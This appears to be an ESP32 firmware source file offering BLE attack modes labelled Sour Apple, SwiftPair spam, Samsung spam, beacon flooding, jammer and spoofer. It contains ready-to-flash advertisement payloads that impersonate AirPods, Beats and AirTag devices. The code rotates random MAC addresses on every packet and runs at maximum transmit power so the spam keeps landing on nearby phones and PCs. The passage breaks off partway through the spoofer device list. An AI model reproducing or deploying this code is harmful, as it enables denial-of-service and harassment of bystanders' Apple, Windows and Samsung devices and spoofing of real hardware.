#include <Arduino.h>
#include <NimBLEDevice.h>
#include <NimBLEAdvertising.h>
#include <Adafruit_ILI9341.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include "app_state.h"
#include "system_types.h"
#include "ui.h"

extern Adafruit_ILI9341 tft;
extern RadioMode currentRadioMode;
extern bool attackFirstDraw;
extern unsigned long attackLastSend;
extern uint32_t attackPacketsSent;

// BLE Attack initialization state
static bool bleAttackInitialized = false;

// Initialize BLE for attacks - stops WiFi and inits BLE
bool initBLEForAttacks() {
    // Always deinit first so re-entry after WiFi works cleanly
    if (bleAttackInitialized) {
        NimBLEDevice::deinit(true);
        bleAttackInitialized = false;
        delay(50);
    }

    // Tear down WiFi stack fully
    WiFi.mode(WIFI_OFF);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(100);

    // Release classic BT memory so NimBLE has room
    esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
    delay(20);

    // Initialize BLE
    if (!NimBLEDevice::init("")) {
        return false;
    }
    delay(50);

    // Set MAXIMUM transmission power for MAXIMUM range
    // Use +9 dBm (maximum safe power level for ESP32)
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);  // Set to maximum power
    
    // Additional ESP32 power boost - set controller TX power to maximum
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);

    bleAttackInitialized = true;
    return true;
}

// Helper: reinit BLE with a fresh random MAC for maximum effectiveness
// This is the only reliable way to change MAC on ESP32 NimBLE
bool bleReinitWithRandomMac() {
    if (NimBLEDevice::isInitialized()) {
        NimBLEDevice::deinit(true);
        delay(15);
    }
    // Ensure WiFi is off — BT and WiFi share the radio on ESP32
    WiFi.mode(WIFI_OFF);
    if (!NimBLEDevice::init("")) return false;
    
    // Set MAXIMUM power for maximum range
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    
    // Random locally-administered address
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) mac[i] = random(0, 256);
    mac[0] = (mac[0] & 0xFE) | 0xC2;  // locally administered, random, unicast
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    NimBLEDevice::setOwnAddr(NimBLEAddress(mac, BLE_ADDR_RANDOM));
    return true;
}

// Helper: send one raw advertisement payload and return
// Increased dwell time and repetition for maximum range and effectiveness
void bleSendRawAdv(const uint8_t* data, size_t len, uint32_t dwellMs = 200) {
    NimBLEAdvertisementData adv;
    adv.addData(data, len);
    NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
    
    // Set advertising parameters for maximum range
    pAdv->setMinInterval(32);   // 20ms minimum interval (faster = more packets)
    pAdv->setMaxInterval(32);   // 20ms maximum interval
    
    pAdv->setAdvertisementData(adv);
    pAdv->start();
    delay(dwellMs);  // Increased default dwell time for better range
    pAdv->stop();
}

// ===== SOUR APPLE ATTACK =====
// Apple device proximity pairing spam - AirPods and Beats headphones only
// Based on research by ECTO-1A, ported by RapierXbox

static const uint8_t sourApplePayloads[][31] = {
    // AirPods Gen 2
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // AirPods Gen 3
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // AirPods Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // AirPods Pro Gen 2
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // AirPods Max
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // PowerBeats
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // PowerBeats Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Solo Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Studio 3
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Studio Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Studio Buds
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Studio Buds Plus
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Fit Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Flex
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats X
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Solo 3
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
};

static int sourAppleIndex = 0;
static const int sourAppleCount = sizeof(sourApplePayloads) / sizeof(sourApplePayloads[0]);

void runSourApple() {
    if (attackFirstDraw) {
        // Initialize BLE
        if (!initBLEForAttacks()) {
            tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
            tft.setTextSize(1);
            tft.setTextColor(ILI9341_RED);
            tft.setCursor(18, 40);
            tft.print("BLE Init Failed!");
            return;
        }
        
        tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
        tft.setTextSize(2);
        tft.setTextColor(tft.color565(255, 100, 100));
        tft.setCursor(18, 40);
        tft.print("Sour Apple");
        
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160,160,160));
        tft.setCursor(18, 58);
        tft.print("AirPods & Beats spam");
        tft.setCursor(18, 70);
        tft.print("16 device types");
        
        attackFirstDraw = false;
        attackPacketsSent = 0;
        attackLastSend = 0;
        sourAppleIndex = 0;
    }
    
    if (millis() - attackLastSend < 200) return;
    attackLastSend = millis();

    // Reinit with new MAC — required for iOS to see each as a new device
    if (!bleReinitWithRandomMac()) return;

    const uint8_t* basePayload = sourApplePayloads[sourAppleIndex];
    sourAppleIndex = (sourAppleIndex + 1) % sourAppleCount;

    uint8_t payload[31];
    memcpy(payload, basePayload, 31);
    for (int i = 19; i < 31; i++) payload[i] = random(0, 256);

    bleSendRawAdv(payload, 31, 150);

    attackPacketsSent++;

    tft.fillRect(12, 90, 216, 60, ILI9341_BLACK);
    tft.setTextSize(2);
    tft.setTextColor(tft.color565(255, 100, 100));
    tft.setCursor(18, 95);
    tft.print("Sent: ");
    tft.print(attackPacketsSent);
    tft.setTextSize(1);
    tft.setTextColor(tft.color565(160,160,160));
    tft.setCursor(18, 120);
    tft.print("Type: ");
    const char* types[] = {"AirPods","AirPods Pro","AirPods Max","PowerBeats","Beats Solo","Beats Studio","Beats Fit","Beats Flex"};
    tft.print(types[min(sourAppleIndex / 2, 7)]);
    tft.setCursor(18, 135);
    tft.setTextColor(ILI9341_GREEN);
    tft.print("Status: ACTIVE  MAC rotated");
}

// ===== SWIFTPAIR SPAM ATTACK =====
// Windows SwiftPair notification spam

static uint8_t swiftpairPayload[25] = {
    0x18, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, // SwiftPair header
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Random data
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

void runSwiftPairSpam() {
    if (attackFirstDraw) {
        // Initialize BLE
        if (!initBLEForAttacks()) {
            tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
            tft.setTextSize(1);
            tft.setTextColor(ILI9341_RED);
            tft.setCursor(18, 40);
            tft.print("BLE Init Failed!");
            return;
        }
        
        tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
        tft.setTextSize(2);
        tft.setTextColor(tft.color565(100, 150, 255));
        tft.setCursor(18, 40);
        tft.print("SwiftPair");
        
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160,160,160));
        tft.setCursor(18, 58);
        tft.print("Windows pairing spam");
        
        attackFirstDraw = false;
        attackPacketsSent = 0;
        attackLastSend = 0;
    }
    
    if (millis() - attackLastSend < 180) return;
    attackLastSend = millis();

    // Full reinit = new MAC every packet — critical for continuous Windows notifications
    if (!bleReinitWithRandomMac()) return;

    // Randomize the variable payload bytes (keep header intact)
    for (int i = 7; i < 25; i++) swiftpairPayload[i] = random(0, 256);

    bleSendRawAdv(swiftpairPayload, 25, 160);

    attackPacketsSent++;

    // Update UI every packet
    tft.fillRect(12, 90, 216, 60, ILI9341_BLACK);
    tft.setTextSize(2);
    tft.setTextColor(tft.color565(100, 150, 255));
    tft.setCursor(18, 95);
    tft.print("Sent: ");
    tft.print(attackPacketsSent);
    tft.setTextSize(1);
    tft.setTextColor(ILI9341_GREEN);
    tft.setCursor(18, 120);
    tft.print("Status: Active  MAC rotated");
}

// ===== SAMSUNG SPAM ATTACK =====
static uint8_t samsungPayload[27] = {
    0x1a, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00,
    0x43, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

void runSamsungSpam() {
    if (attackFirstDraw) {
        // Initialize BLE
        if (!initBLEForAttacks()) {
            tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
            tft.setTextSize(1);
            tft.setTextColor(ILI9341_RED);
            tft.setCursor(18, 40);
            tft.print("BLE Init Failed!");
            return;
        }
        
        tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
        tft.setTextSize(2);
        tft.setTextColor(tft.color565(100, 200, 255));
        tft.setCursor(18, 40);
        tft.print("Samsung Spam");
        
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160,160,160));
        tft.setCursor(18, 58);
        tft.print("Samsung device spam");
        
        attackFirstDraw = false;
        attackPacketsSent = 0;
        attackLastSend = 0;
    }
    
    if (millis() - attackLastSend < 150) return;
    attackLastSend = millis();

    if (!bleReinitWithRandomMac()) return;

    for (int i = 13; i < 27; i++) samsungPayload[i] = random(0, 256);

    bleSendRawAdv(samsungPayload, 27, 100);

    attackPacketsSent++;

    tft.fillRect(12, 90, 216, 60, ILI9341_BLACK);
    tft.setTextSize(2);
    tft.setTextColor(tft.color565(100, 200, 255));
    tft.setCursor(18, 95);
    tft.print("Sent: ");
    tft.print(attackPacketsSent);
    tft.setTextSize(1);
    tft.setTextColor(ILI9341_GREEN);
    tft.setCursor(18, 120);
    tft.print("Status: Active  MAC rotated");
}

// ===== BLE BEACON SPAM ATTACK =====
// Rapidly creates many different BLE beacons to flood Bluetooth settings
static uint32_t beaconSpamCount = 0;

// Reduced OUI list from ESP32-BLEBeaconSpam
static const uint32_t ouiList[] = {
    0x000000, 0x000006, 0x00000C, 0x00005E, 0x0000F8, 0x000142, 0x000143,
    0x00037F, 0x0003BA, 0x000B86, 0x000C42, 0x000FAC, 0x001090, 0x0012BB,
    0x001958, 0x001977, 0x004096, 0x0050F2, 0x0080C2, 0x00904C, 0x506F9A
};
static const int ouiCount = sizeof(ouiList) / sizeof(ouiList[0]);

// Random name prefixes
static const char* namePrefix[] = {
    "iPhone", "iPad", "MacBook", "AirPods", "Watch", "Beacon", "Device",
    "Sensor", "Smart", "Home", "Office", "Car", "Bike", "Tag", "Tracker"
};
static const int namePrefixCount = sizeof(namePrefix) / sizeof(namePrefix[0]);

void runBLEBeaconSpam() {
    if (attackFirstDraw) {
        tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
        tft.setTextSize(2);
        tft.setTextColor(tft.color565(100, 255, 100));
        tft.setCursor(18, 40);
        tft.print("Beacon Spam");
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160,160,160));
        tft.setCursor(18, 58);
        tft.print("Floods BT with devices");
        attackFirstDraw = false;
        attackPacketsSent = 0;
        attackLastSend = 0;
        beaconSpamCount = 0;
    }

    if (millis() - attackLastSend < 200) return;
    attackLastSend = millis();

    // Full deinit/reinit so the controller actually uses the new MAC
    if (NimBLEDevice::isInitialized()) {
        NimBLEDevice::deinit(true);
        delay(20);
    }
    if (!NimBLEDevice::init("")) return;
    
    // Set MAXIMUM power for maximum range
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);

    // New random MAC from OUI list
    uint32_t randomOui = ouiList[random(0, ouiCount)];
    uint8_t newMac[6] = {
        (uint8_t)(randomOui >> 16),
        (uint8_t)(randomOui >> 8),
        (uint8_t)randomOui,
        (uint8_t)random(0, 256),
        (uint8_t)random(0, 256),
        (uint8_t)random(0, 256)
    };
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    NimBLEDevice::setOwnAddr(NimBLEAddress(newMac, BLE_ADDR_RANDOM));

    // Random device name and manufacturer data
    char deviceName[20];
    snprintf(deviceName, sizeof(deviceName), "%s-%04X",
        namePrefix[random(0, namePrefixCount)], random(0, 0xFFFF));

    uint16_t randomVendor = random(0, 0x06E2);
    uint8_t manufData[4] = {
        (uint8_t)(randomVendor & 0xFF),
        (uint8_t)(randomVendor >> 8),
        (uint8_t)random(0, 256),
        (uint8_t)random(0, 256)
    };

    NimBLEAdvertisementData advData;
    advData.setName(deviceName);
    advData.setManufacturerData(std::string((char*)manufData, 4));
    advData.setFlags(0x06);

    NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
    
    // Set advertising parameters for maximum range
    pAdv->setMinInterval(32);   // 20ms minimum interval
    pAdv->setMaxInterval(32);   // 20ms maximum interval
    
    // BUG FIX 1.25: Add scan response data for mobile device visibility
    NimBLEAdvertisementData scanResponse;
    scanResponse.setName(deviceName);
    scanResponse.setCompleteServices(NimBLEUUID("180F"));  // Battery service for mobile compatibility
    
    NimBLEDevice::setDeviceName(deviceName);
    pAdv->setAdvertisementData(advData);
    pAdv->setScanResponseData(scanResponse);  // Add scan response for mobile devices
    pAdv->start();
    delay(120);  // Increased dwell time for better range
    pAdv->stop();

    attackPacketsSent++;
    beaconSpamCount++;

    if (attackPacketsSent % 3 == 0) {
        tft.fillRect(12, 90, 216, 60, ILI9341_BLACK);
        tft.setTextSize(2);
        tft.setTextColor(tft.color565(100, 255, 100));
        tft.setCursor(18, 95);
        tft.print("Sent: ");
        tft.print(beaconSpamCount);
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160,160,160));
        tft.setCursor(18, 120);
        tft.print("Last: ");
        tft.print(deviceName);
        tft.setCursor(18, 135);
        tft.setTextColor(ILI9341_GREEN);
        tft.print("Status: FLOODING");
    }
}

// ===== BT SPAM ALL ATTACK =====
static int spamAllMode = 0;

void runBTSpamAll() {
    if (attackFirstDraw) {
        // Initialize BLE
        if (!initBLEForAttacks()) {
            tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
            tft.setTextSize(1);
            tft.setTextColor(ILI9341_RED);
            tft.setCursor(18, 40);
            tft.print("BLE Init Failed!");
            return;
        }
        
        tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
        tft.setTextSize(2);
        tft.setTextColor(tft.color565(255, 0, 255));
        tft.setCursor(18, 40);
        tft.print("BT Spam All");
        
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160,160,160));
        tft.setCursor(18, 58);
        tft.print("All attacks combined");
        
        attackFirstDraw = false;
        attackPacketsSent = 0;
        attackLastSend = 0;
        spamAllMode = 0;
    }
    
    if (millis() - attackLastSend < 180) return;
    attackLastSend = millis();

    // Reinit with new MAC every packet
    if (!bleReinitWithRandomMac()) return;

    switch (spamAllMode) {
        case 0: {
            uint8_t pl[31]; memcpy(pl, sourApplePayloads[random(0, sourAppleCount)], 31);
            for (int i = 19; i < 31; i++) pl[i] = random(0, 256);
            bleSendRawAdv(pl, 31, 120);
            break;
        }
        case 1: {
            for (int i = 7; i < 25; i++) swiftpairPayload[i] = random(0, 256);
            bleSendRawAdv(swiftpairPayload, 25, 120);
            break;
        }
        case 2: {
            for (int i = 13; i < 27; i++) samsungPayload[i] = random(0, 256);
            bleSendRawAdv(samsungPayload, 27, 100);
            break;
        }
        case 3: {
            char deviceName[20];
            snprintf(deviceName, sizeof(deviceName), "%s-%04X",
                namePrefix[random(0, namePrefixCount)], random(0, 0xFFFF));
            uint16_t vendor = random(0, 0x06E2);
            uint8_t mfg[4] = {(uint8_t)(vendor&0xFF),(uint8_t)(vendor>>8),(uint8_t)random(0,256),(uint8_t)random(0,256)};
            NimBLEAdvertisementData adv;
            adv.setName(deviceName);
            adv.setManufacturerData(std::string((char*)mfg, 4));
            adv.setFlags(0x06);
            NimBLEDevice::getAdvertising()->setAdvertisementData(adv);
            NimBLEDevice::getAdvertising()->start();
            delay(100);
            NimBLEDevice::getAdvertising()->stop();
            break;
        }
    }

    spamAllMode = (spamAllMode + 1) % 4;
    attackPacketsSent++;

    tft.fillRect(12, 90, 216, 60, ILI9341_BLACK);
    tft.setTextSize(2);
    tft.setTextColor(tft.color565(255, 0, 255));
    tft.setCursor(18, 95);
    tft.print("Sent: ");
    tft.print(attackPacketsSent);
    tft.setTextSize(1);
    tft.setTextColor(tft.color565(160,160,160));
    tft.setCursor(18, 120);
    const char* modes[] = {"Apple", "Windows", "Samsung", "Beacon"};
    tft.print("Mode: "); tft.print(modes[spamAllMode]);
    tft.setCursor(18, 135);
    tft.setTextColor(ILI9341_GREEN);
    tft.print("Status: Active  MAC rotated");
}


// ===== BLE JAMMER ATTACK =====
// Rapidly sends malformed packets on BLE advertising channels to disrupt connections
static int jammerChannel = 37;
static uint32_t jammerPacketsSent = 0;

void runBLEJammer() {
    if (attackFirstDraw) {
        if (!initBLEForAttacks()) {
            tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
            tft.setTextSize(1);
            tft.setTextColor(ILI9341_RED);
            tft.setCursor(18, 40);
            tft.print("BLE Init Failed!");
            return;
        }
        tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
        tft.setTextSize(2);
        tft.setTextColor(tft.color565(255, 50, 50));
        tft.setCursor(18, 40);
        tft.print("BLE Jammer");
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160,160,160));
        tft.setCursor(18, 58);
        tft.print("Disrupts BLE connections");
        attackFirstDraw = false;
        attackPacketsSent = 0;
        attackLastSend = 0;
        jammerChannel = 37;
        jammerPacketsSent = 0;
    }

    // Reinit with new MAC, then fire 3 rapid bursts
    if (!bleReinitWithRandomMac()) return;

    uint8_t jamData[31];
    jamData[0] = 0x1E;
    jamData[1] = 0xFF;
    for (int burst = 0; burst < 3; burst++) {
        for (int i = 2; i < 31; i++) jamData[i] = random(0, 256);
        bleSendRawAdv(jamData, 31, 5);
        attackPacketsSent++;
        jammerPacketsSent++;
    }

    jammerChannel = (jammerChannel >= 39) ? 37 : jammerChannel + 1;

    if (jammerPacketsSent % 30 == 0) {
        tft.fillRect(12, 90, 216, 80, ILI9341_BLACK);
        tft.setTextSize(2);
        tft.setTextColor(tft.color565(255, 50, 50));
        tft.setCursor(18, 95);
        tft.print("Sent: ");
        tft.print(attackPacketsSent);
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160,160,160));
        tft.setCursor(18, 120);
        tft.print("3x burst  MAC rotated each");
        tft.setCursor(18, 135);
        tft.setTextColor(ILI9341_RED);
        tft.print("Status: JAMMING");
    }
}

// ===== BLE SPOOFER ATTACK =====
// Like Sour Apple but you choose which specific device to spam
static uint32_t spooferDeviceCount = 0;
static int spooferSelectedDevice = 0;
static bool spooferMenuMode = true; // true = menu, false = spamming

// Device list with names and payloads (similar to Sour Apple)
struct SpooferDevice {
    const char* name;
    uint8_t payload[31];
};

static const SpooferDevice spooferDevices[] = {
    // Apple AirPods
    {"AirPods", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"AirPods Gen 2", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"AirPods Gen 3", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"AirPods Pro", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"AirPods Pro 2", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"AirPods Max", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    
    // Apple AirTag - BUG FIX 1.27: Corrected payload format
    {"AirTag", {0x1e, 0xff, 0x4c, 0x00, 0x12, 0x19, 0x10, 0x05, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77}},
    
    // Beats
    {"PowerBeats", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"PowerBeats Pro", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Beats Solo Pro", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Beats Studio 3", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Beats Studio Pro", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Beats Fit Pro", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Beats Flex", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Beats Solo 3", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Beats X", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
